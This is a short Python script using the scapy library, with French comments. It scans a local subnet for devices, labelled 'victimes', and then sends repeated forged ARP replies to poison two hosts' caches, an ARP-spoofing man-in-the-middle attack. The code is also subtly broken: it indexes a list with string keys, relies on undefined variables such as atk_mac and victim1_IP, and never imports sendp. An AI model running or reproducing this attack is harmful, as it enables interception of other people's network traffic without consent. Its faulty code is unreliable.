from scapy.all import ARP, Ether, srp

packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24") # Crée les paquets

victimes = [] # tableau des appareils présents

for sent, received in srp(packet, timeout=3)[0]:
    victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
# Ajoute les infos de chaque nouvel appareil trouvé dans le tableau

print("\n" + "Available devices in the network :" + "\n" + "IP" + " "*18 + "MAC")
for victime in victimes: # affiche les adresse ip et mac des appareils connectés au réseau qui sont dans le tableau victimes
    print(victime['ip'])
    print(victime['mac'] + "\n")
    
victime_ip = victimes['ip'][1]
victime_mac = victimes['mac'][1]

passerelle_ip = victimes['ip'][2]
passerelle_mac = victimes['mac'][2]

nb_packets = 0
while nb_packets < 100:
    spoof_arp_victim1 = Ether(src=atk_mac)/ARP(op=2, pdst=victim1_IP, hwdst=victim1_MAC, psrc=victim2_IP)
    send_spoof1 = sendp(spoof_arp_victim1)
    spoof_arp_victim2 = Ether(src=atk_mac)/ARP(op=2, pdst=victim2_IP, hwdst=victim2_MAC, psrc=victim1_IP)
    send_spoof2 = sendp(spoof_arp_victim2)
    nb_packets += 2

print(nb_packets)